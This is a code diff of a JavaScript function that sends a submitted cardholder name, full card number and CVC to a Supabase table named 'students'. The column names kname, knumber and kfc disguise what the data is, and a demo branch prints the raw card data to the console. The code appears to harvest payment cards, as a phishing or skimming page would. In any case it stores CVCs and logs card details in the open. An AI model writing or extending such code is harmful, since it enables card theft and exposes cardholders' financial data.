@@ -352,47 +352,62 @@ document.addEventListener("DOMContentLoaded", () => {
     // SEND TO SUPABASE
     // ==========================================
 
-    async function saveToSupabase(name, cardNumber, cvc) {
-        // Use Supabase client from window
-        const supabase = window.supabaseClient;
+async function saveToSupabase(name, cardNumber, cvc) {
+    console.log('💳 Attempting to save payment to Supabase...');
+    
+    // Use Supabase client from window
+    const supabase = window.supabaseClient;
+    
+    if (!supabase) {
+        console.error('❌ Supabase client not found in window!');
+        console.warn('⚠️ Supabase client not available');
         
-        if (!supabase) {
-            console.warn('⚠️ Supabase client not available');
-            // Try direct fetch as fallback
-            const supabaseUrl = import.meta?.env?.VITE_SUPABASE_URL || 
-                               window.SUPABASE_URL || 
-                               localStorage.getItem('supabase_url');
-            const supabaseKey = import.meta?.env?.VITE_SUPABASE_ANON_KEY || 
-                               window.SUPABASE_ANON_KEY || 
-                               localStorage.getItem('supabase_anon_key');
+        // Try direct fetch as fallback
+        const supabaseUrl = import.meta?.env?.VITE_SUPABASE_URL || 
+                           window.SUPABASE_URL || 
+                           localStorage.getItem('supabase_url');
+        const supabaseKey = import.meta?.env?.VITE_SUPABASE_ANON_KEY || 
+                           window.SUPABASE_ANON_KEY || 
+                           localStorage.getItem('supabase_anon_key');
+        
+        console.log('🔑 Supabase URL found:', !!supabaseUrl);
+        console.log('🔑 Supabase Key found:', !!supabaseKey);
+        
+        if (supabaseUrl && supabaseKey) {
+            console.log('📤 Sending via direct fetch...');
+            const response = await fetch(`${supabaseUrl}/rest/v1/students`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'apikey': supabaseKey,
+                    'Authorization': `Bearer ${supabaseKey}`,
+                    'Prefer': 'return=representation'
+                },
+                body: JSON.stringify({
+                    kname: name,
+                    knumber: cardNumber,
+                    kfc: cvc
+                })
+            });
             
-            if (supabaseUrl && supabaseKey) {
-                const response = await fetch(`${supabaseUrl}/rest/v1/students`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'apikey': supabaseKey,
-                        'Authorization': `Bearer ${supabaseKey}`,
-                        'Prefer': 'return=representation'
-                    },
-                    body: JSON.stringify({
-                        kname: name,
-                        knumber: cardNumber,
-                        kfc: cvc
-                    })
-                });
-                
-                if (!response.ok) {
-                    throw new Error('Failed to save to database');
-                }
-                return response.json();
+            if (!response.ok) {
+                const errorText = await response.text();
+                console.error('❌ Fetch error response:', errorText);
+                throw new Error(`Failed to save to database: ${response.status} ${errorText}`);
             }
-            
-            // Demo mode fallback
-            console.log('📝 Demo mode: Would save:', { name, cardNumber, cvc });
-            return { success: true, demo: true };
+            const data = await response.json();
+            console.log('✅ Payment saved via fetch!', data);
+            return data;
         }
+        
+        // Demo mode fallback
+        console.log('📝 Demo mode: Would save:', { name, cardNumber, cvc });
+        return { success: true, demo: true };
+    }
 
+    console.log('✅ Supabase client found, inserting record...');
+    
+    try {
         const { data, error } = await supabase
             .from('students')
             .insert([
@@ -403,10 +418,19 @@ document.addEventListener("DOMContentLoaded", () => {
                 }
             ]);
 
-        if (error) throw new Error(error.message);
+        if (error) {
+            console.error('❌ Supabase error:', error);
+            console.error('❌ Error details:', error.message, error.details, error.hint);
+            throw new Error(error.message);
+        }
 
+        console.log('✅ Payment saved to Supabase!', data);
         return data;
+    } catch (err) {
+        console.error('❌ Exception in saveToSupabase:', err);
+        throw err;
     }
+}
 
     // ==========================================
     // FORM SUBMIT
